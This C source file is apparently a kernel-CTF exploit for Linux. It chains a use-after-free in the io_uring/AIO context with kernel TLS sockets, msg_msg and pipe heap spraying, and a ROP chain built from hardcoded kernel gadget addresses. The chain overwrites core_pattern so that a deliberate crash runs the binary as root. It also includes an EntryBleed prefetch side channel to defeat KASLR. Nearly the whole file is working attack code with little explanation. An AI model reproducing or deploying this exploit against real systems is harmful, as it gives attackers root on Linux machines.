#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <sys/prctl.h>
#include <stdlib.h>
#include <sys/msg.h>
#include <sys/resource.h>
#include <sched.h>
#include <sys/wait.h>
#include <unistd.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <linux/if_alg.h>
#include <pthread.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/sendfile.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <linux/tls.h>
#include <linux/vm_sockets.h>
#include <err.h>

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;
#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))


#define PAUSE           \
{                   \
        int x;          \
        printf(":");    \
        read(0, &x, 1); \
}

#define SYSCHK(x) ({              \
                typeof(x) __res = (x);        \
                if (__res == (typeof(x))-1)   \
                err(1, "SYSCHK(" #x ")"); \
                __res;                        \
                })


void set_cpu(int i)
{
        cpu_set_t mask;
        CPU_ZERO(&mask);
        CPU_SET(i, &mask);
        sched_setaffinity(0, sizeof(mask), &mask);
}

char buf[1<<16];
const char fake_core_pattern[] = "|/proc/%P/fd/666 %P a";


size_t ktext;
#define KNOWN_ADDR              (ktext + 0xffffffff84ca9000UL - 0xffffffff81000000UL)
#define PUSH_RDI_POP_RSP        (ktext + 0xffffffff81bde9fdUL - 0xffffffff81000000UL)
#define ADD_RSP_0X18            (ktext + 0xffffffff81122d1cUL - 0xffffffff81000000UL)

#define POP_RDI_RET             (ktext + 0xffffffff81140680UL - 0xffffffff81000000UL)
#define POP_RSI_RET             (ktext + 0xffffffff8144450eUL - 0xffffffff81000000UL)
#define POP_RDX_RET             (ktext + 0xffffffff811a7e42UL - 0xffffffff81000000UL)
#define MSLEEP                  (ktext + 0xffffffff81242730UL - 0xffffffff81000000UL)
#define COPY_FROM_USER          (ktext + 0xffffffff818dfa90UL - 0xffffffff81000000UL)
#define CORE_PATTERN            (ktext + 0xffffffff83bbb3c0UL - 0xffffffff81000000UL)
#define MODULE_SYSFS_OPS        (ktext + 0xffffffff8282de20UL - 0xffffffff81000000UL)

#define PORT 4444

uint64_t stext = 0;
int vsock_bind(unsigned int cid, unsigned int port, int type)
{
        struct sockaddr_vm sa = {
                .svm_family = AF_VSOCK,
                .svm_cid = cid,
                .svm_port = port,
        };

        int fd = SYSCHK(socket(AF_VSOCK, type, 0));
        SYSCHK(bind(fd, (struct sockaddr *)&sa, sizeof(sa)));

        return fd;
}
int vsock_connect_fd(int fd, unsigned int cid, unsigned int port)
{
        struct sockaddr_vm sa = {
                .svm_family = AF_VSOCK,
                .svm_cid = cid,
                .svm_port = port,
        };
        int ret;

        do
        {
                ret = connect(fd, (struct sockaddr *)&sa, sizeof(sa));

        } while (ret < 0 && errno == EINTR);
        printf("connect success\n");

        return ret;
}


int listen_vsockfd = -1;
struct sockaddr_vm listen_vsock_addr;

int vsock_pair(int fd[2]) {
        if(listen_vsockfd == -1) {
                int fd = vsock_bind(VMADDR_CID_ANY, VMADDR_PORT_ANY, SOCK_STREAM);
                printf("fd %d\n", fd);
                SYSCHK(listen(fd,1));
                int alen = sizeof(listen_vsock_addr);
                SYSCHK(getsockname(fd, (struct sockaddr *)&listen_vsock_addr, &alen));
                listen_vsockfd = fd;
        }
        int flag = 1;
        int client = SYSCHK(socket(AF_VSOCK, SOCK_STREAM, 0));
        SYSCHK(setsockopt(client, SOL_SOCKET, SO_ZEROCOPY, &flag, sizeof(flag)));
        vsock_connect_fd(client, listen_vsock_addr.svm_cid, listen_vsock_addr.svm_port);
        int serv = SYSCHK(accept(listen_vsockfd,0,0));
        fd[0] = client;
        fd[1] = serv;
        //SYSCHK(setsockopt(serv, AF_VSOCK, SO_ZEROCOPY, &flag, sizeof(flag)));
}


void DumpHex(const void *data, size_t size)
{
        char ascii[17];
        size_t i, j;
        ascii[16] = '\0';
        for (i = 0; i < size; ++i)
        {
                printf("%02X ", ((unsigned char *)data)[i]);
                if (((unsigned char *)data)[i] >= ' ' && ((unsigned char *)data)[i] <= '~')
                {
                        ascii[i % 16] = ((unsigned char *)data)[i];
                }
                else
                {
                        ascii[i % 16] = '.';
                }
                if ((i + 1) % 8 == 0 || i + 1 == size)
                {
                        printf(" ");
                        if ((i + 1) % 16 == 0)
                        {
                                printf("|  %s \n", ascii);
                        }
                        else if (i + 1 == size)
                        {
                                ascii[(i + 1) % 16] = '\0';
                                if ((i + 1) % 16 <= 8)
                                {
                                        printf(" ");
                                }
                                for (j = (i + 1) % 16; j < 16; ++j)
                                {
                                        printf("   ");
                                }
                                printf("|  %s \n", ascii);
                        }
                }
        }
}

#define PAUSE           \
{                   \
        int x;          \
        printf(":");    \
        read(0, &x, 1); \
}
#define PORT 4444

struct
{
        long mtype;
        char mtext[0x2000];
} msg;

int msqid[0x4000];

int cfd[0x100][0x2];

struct tls12_crypto_info_aes_ccm_128 crypto = {0};
void setup_tls(int sock)
{
        crypto.info.version = TLS_1_3_VERSION;
        crypto.info.cipher_type = TLS_CIPHER_AES_CCM_128;

        // Static dummy keys for demo
        memset(crypto.iv, 0x0, TLS_CIPHER_AES_CCM_128_IV_SIZE);
        memset(crypto.rec_seq, 0x0, TLS_CIPHER_AES_CCM_128_REC_SEQ_SIZE);
        memset(crypto.key, 0x0, TLS_CIPHER_AES_CCM_128_KEY_SIZE);
        memset(crypto.salt, 0x0, TLS_CIPHER_AES_CCM_128_SALT_SIZE);

        if (setsockopt(sock, SOL_TCP, TCP_ULP, "tls", sizeof("tls")) < 0)
        {
                perror("setsockopt TCP_ULP");
                exit(1);
        }
        if (setsockopt(sock, SOL_TLS, TLS_TX, &crypto, sizeof(crypto)) < 0)
        {
                perror("setsockopt TLS_TX");
                exit(1);
        }
}
int check_core()
{
        // Check if /proc/sys/kernel/core_pattern has been overwritten
        char buf[0x100] = {};
        int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
        read(core, buf, sizeof(buf));
        close(core);
        return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}
void crash(char *cmd)
{
        int memfd = memfd_create("", 0);
        SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
        dup2(memfd, 666);
        close(memfd);
        while (check_core() == 0)
                sleep(1);

        puts("Root shell !!");
        /* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
        *(size_t *)0 = 0;
}

char buf2[0x10000];
int sprayfd[0x100][0x2];
int sprayfd2[0x100][0x2];
int pfds[0x1000][2];
char *addrs[0x1000];

size_t bypass_kaslr(u64 base);
int main(int argc, char **argv)
{
        struct rlimit rlim = {
                .rlim_cur = 0x1000,
                .rlim_max = 0x1000};
        SYSCHK(setrlimit(RLIMIT_NOFILE, &rlim));


        if (argc > 2)
        {

                // This section of code will be execute by root!
                int pid = strtoull(argv[1], 0, 10);
                int pfd = syscall(SYS_pidfd_open, pid, 0);
                int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
                int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
                int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
                dup2(stdinfd, 0);
                dup2(stdoutfd, 1);
                dup2(stderrfd, 2);
                /* Get flag and poweroff immediately to boost next round try in PR verification workflow*/
                system("cat /flag");
                system("cat /flag");
                sleep(1);
                system("cat /flag;echo o>/proc/sysrq-trigger");
                exit(0);
        }
        if (fork() == 0) // this process is used to trigger core_pattern exploit
        {
                set_cpu(1);
                setsid();
                crash("");                                                                     }



        //ktext = bypass_kaslr(0);
	ktext = 0xffffffff81000000UL;
        printf("got ktext %zx\n", ktext);


        while(1) {
                if(fork()) {
                        wait(NULL);
                        sleep(5);
                        continue;
                }
                break;
        }

        int listener, conn, client;
        struct sockaddr_in addr = {0};
        int sfd[2];
        //SYSCHK(socketpair(AF_UNIX,SOCK_STREAM,0,sfd));
        //vsock_pair(sfd);

        SYSCHK(socketpair(AF_UNIX,SOCK_STREAM,0,sfd));
        char* puaf = NULL;

        SYSCHK(syscall(SYS_io_setup, 0x180, (size_t*)&puaf));

        int mfd = SYSCHK(memfd_create("",0));
        SYSCHK(fallocate(mfd,0,0,32*0x1000));

        system("ipcrm --all=msg");
        for (int i = 0; i < 0x4000; i++)
        {
                msqid[i] = SYSCHK(msgget(IPC_PRIVATE, 0644 | IPC_CREAT));
        }
        msg.mtype = 1;
        memset(msg.mtext, 'a', 0x2000);

        int pfd[2];
        SYSCHK(pipe(pfd));
        SYSCHK(fcntl(pfd[1],F_SETPIPE_SZ,32*0x1000));
        for (int i = 0; i < 0x600; i++)
        {
                SYSCHK(pipe(pfds[i]));
                SYSCHK(write(pfds[i][1],buf,0x1));
        }

        socklen_t len = sizeof(addr);
        setvbuf(stdin, 0, 2, 0);
        setvbuf(stdout, 0, 2, 0);
        set_cpu(0);


        //nperm_rop_payload();

        // === Setup listener ===
        listener = socket(AF_INET, SOCK_STREAM, 0);
        if (listener < 0)
        {
                perror("socket listener");
                exit(1);
        }

        addr.sin_family = AF_INET;
        addr.sin_port = htons(PORT);
        // inet_pton(AF_INET, "127.0.0.4", &addr.sin_addr);
        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        int optval = 1;
        SYSCHK(setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)));
        SYSCHK(bind(listener, (struct sockaddr *)&addr, sizeof(addr)));
        SYSCHK(listen(listener, 1));
        client = SYSCHK(socket(AF_INET, SOCK_STREAM, 0));

        SYSCHK(connect(client, (struct sockaddr *)&addr, sizeof(addr)));

        // === Accept on server side (non-blocking because client already connected) ===
        conn = SYSCHK(accept(listener, NULL, 0));
        printf("[*] Server accepted connection\n");

        //      SYSCHK(splice(pfds[0][0],0,sfd[0],0,0x6000,0));
        struct iovec iov = {puaf+0x1000, 0xc0};
        for(int i=0;i<31;i++)
                SYSCHK(vmsplice(pfd[1],&iov,1,0));
        printf("write done\n");

        printf("[*] Client connected to server\n");

        setup_tls(client);
        sleep(2);
        SYSCHK(splice(pfd[0],0,mfd,0,31*0xc0+1,0));

        if (setsockopt(client, SOL_TLS, TLS_RX, &crypto, sizeof(crypto)) < 0)
        {
                perror("setsockopt TLS_RX");
                exit(1);
        }

        close(pfd[0]);
        close(pfd[1]);

        int flag = 1;

        printf("[*] Client connected to server\n");

        //setup_tls(conn);

        // sent immediately
        if (setsockopt(conn, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag)) < 0) {
                perror("setsockopt TCP_NODELAY");
                exit(1);
        }
        socklen_t optlen;
        // --- Get current receive buffer ---
        int rcvbuf;
        optlen = sizeof(rcvbuf);
        if (getsockopt(conn, SOL_SOCKET, SO_RCVBUF, &rcvbuf, &optlen) < 0) {
                perror("getsockopt");
                return 1;
        }
        printf("Default SO_RCVBUF = %d bytes\n", rcvbuf);
        rcvbuf = 1<<16;
        SYSCHK(setsockopt(conn, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)));

        /*
         * 0xffffffff81bde9fd : push rdi ; pop rsp ; dec dword ptr [rdi] ; or edi, dword ptr [rax - 1] ; jmp 0x16054e0
         * 0xffffffff81122d1c : add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
         */
        memset(buf,'\xff',sizeof(buf));
        send(conn,buf,5,MSG_OOB);
        for(int i=0;i<0x6;i+=0x1) {
                memset(buf+i*0x1000,'A'+i,0x1000);
                char* p = buf+i*0x1000;
                for(p;p<(buf+(i+1)*0x1000);p+=0xc0) {
                        size_t* rop = (void*)(p+0x20);;
                        memset(p+16,'X',0x8);
                        *(size_t*)(p+16) = MODULE_SYSFS_OPS;
                        *(size_t*)(p+24) = PUSH_RDI_POP_RSP;
                        *(size_t*)(p+0) = ADD_RSP_0X18+1; // previous gadget will dec [rsp], so add 1
                        *rop++ = POP_RDI_RET;
                        *rop++ = CORE_PATTERN;
                        *rop++ = POP_RSI_RET;
                        *rop++ = (size_t)&fake_core_pattern;
                        *rop++ = POP_RDX_RET;
                        *rop++ = 0x30;
                        *rop++ = COPY_FROM_USER;
                        *rop++ = POP_RDI_RET;
                        *rop++ = 0x10000;
                        *rop++ = MSLEEP;

                }
        }
        send(conn,buf,sizeof(buf),0);

        SYSCHK(syscall(SYS_io_destroy, puaf));
        sleep(1);


        int pipe_i = 0;
        for(int i=0;i<0x4000;i++) {
                msgsnd(msqid[i],&msg,0x1000-0x30+0xc0-8,0); // reclaim with kmalloc-192
                                                            // put pipe buffer per slab page
                if((i%21)==0) {
                        fcntl(pfds[pipe_i++][1],F_SETPIPE_SZ,0x4000);
                        fcntl(pfds[pipe_i++][1],F_SETPIPE_SZ,0x4000);
                }
        }

        for(int i=0;i<0x4000;i++) {
                SYSCHK(msgrcv(msqid[i],&msg,0x1000-0x30+0xc0-8,0,IPC_NOWAIT));
        }

        for(int i=0;i<3;i++) {
                printf("%d",i);
                send(conn,buf,5,MSG_OOB);
        }


        for(int i=0;i<0x600;i++) {
                close(pfds[i][0]);
                close(pfds[i][1]);
        }

        return 0;
}

// =-=-=-=-=-=-=-= ENTRYBLEED HELPERS =-=-=-=-=-=-=-=
// https://www.willsroot.io/2022/12/entrybleed.html
#define KERNEL_BASE 0xffffffff81000000
#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
#define KERNEL_UPPER_BOUND 0xffffffffc0000000ull

#define STEP_KERNEL 0x100000ull
#define SCAN_START_KERNEL KERNEL_LOWER_BOUND
#define SCAN_END_KERNEL KERNEL_UPPER_BOUND
#define ARR_SIZE_KERNEL (SCAN_END_KERNEL - SCAN_START_KERNEL) / STEP_KERNEL

#define PHYS_LOWER_BOUND 0xffff888000000000ull
#define PHYS_UPPER_BOUND 0xfffffe0000000000ull

#define STEP_PHYS 0x40000000ull
#define SCAN_START_PHYS PHYS_LOWER_BOUND
#define SCAN_END_PHYS PHYS_UPPER_BOUND
#define ARR_SIZE_PHYS (SCAN_END_PHYS - SCAN_START_PHYS) / STEP_PHYS

#define DUMMY_ITERATIONS 5
#define ITERATIONS 100
#define LEAK_TIMES 5

// Based on experiment, the kernel heap address leaked from sidechannel is KERNEL_PHYS_MAP + LEAKED_OFFSET
#define LEAKED_OFFSET 0x100000000

uint64_t leak_kernel_base, leak_kheap_base, kernel_offset = 0;

uint64_t sidechannel(uint64_t addr) {
    uint64_t a, b, c, d;
    asm volatile (
        ".intel_syntax noprefix;"
        "mfence;"
        "rdtscp;"
        "mov %0, rax;"
        "mov %1, rdx;"
        "xor rax, rax;"
        "lfence;"
        "prefetchnta qword ptr [%4];"
        "prefetcht2 qword ptr [%4];"
        "xor rax, rax;"
        "lfence;"
        "rdtscp;"
        "mov %2, rax;"
        "mov %3, rdx;"
        "mfence;"
        ".att_syntax;"
         : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
         : "r" (addr)
         : "rax", "rbx", "rcx", "rdx"
    );
    a = (b << 32) | a;
    c = (d << 32) | c;
    return c - a;
}

uint64_t prefetch(int phys) {
        uint64_t arr_size = ARR_SIZE_KERNEL;
        uint64_t scan_start = SCAN_START_KERNEL;
        uint64_t step_size = STEP_KERNEL;
        if (phys)
        {
                arr_size = ARR_SIZE_PHYS;
                scan_start = SCAN_START_PHYS;
                step_size = STEP_PHYS;
        }

        uint64_t *data = malloc(arr_size * sizeof(uint64_t));
        memset(data, 0, arr_size * sizeof(uint64_t));
    uint64_t addr = ~0;

    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++) {
        for (uint64_t idx = 0; idx < arr_size; idx++) {
            uint64_t test = scan_start + idx * step_size;
            syscall(104);
            uint64_t time = sidechannel(test);
            if (i >= DUMMY_ITERATIONS) {
                data[idx] += time;
            }
        }
    }
    for (int i = 0; i < arr_size; i++) {
        data[i] /= ITERATIONS;
    }
    double initial_avg = 0.0;
    for (int i = 0; i < arr_size; i++) {
        initial_avg += data[i];
    }
    initial_avg /= arr_size;
    double background_avg = 0.0;
    int count = 0;
    for (int i = 0; i < arr_size; i++) {
        if (data[i] <= initial_avg * 1.1) {
            background_avg += data[i];
            count++;
        }
    }
    if (count > 0) {
        background_avg /= count;
    } else {
        background_avg = initial_avg;
    }
    // Select the first address whose time is lower than threshold as target address
    // threshold = 0.9 * average_time
    double threshold = background_avg * 0.9;
    for (int i = 0; i < arr_size; i++) {
        if (data[i] < threshold) {
            addr = scan_start + i * step_size;
            break;
        }
    }
    return addr;
}

size_t mostFrequent(size_t *arr, size_t n)
{
    size_t maxcount = 0;
    size_t element_having_max_freq;
    for (int i = 0; i < n; i++)
    {
        size_t Count = 0;
        for (int j = 0; j < n; j++)
        {
            if (arr[i] == arr[j])
            Count++;
        }
        if (Count > maxcount)
        {
            maxcount = Count;
            element_having_max_freq = arr[i];
        }
    }
    return element_having_max_freq;
}

size_t bypass_kaslr(u64) {
    size_t kbase[LEAK_TIMES] = {0};
    for (int i = 0; i < LEAK_TIMES; i++)
    {
        kbase[i] = prefetch(0);
        printf("%dth iteration leak: 0x%lx", i, kbase[i]);
    }
    return mostFrequent(kbase, LEAK_TIMES);
}
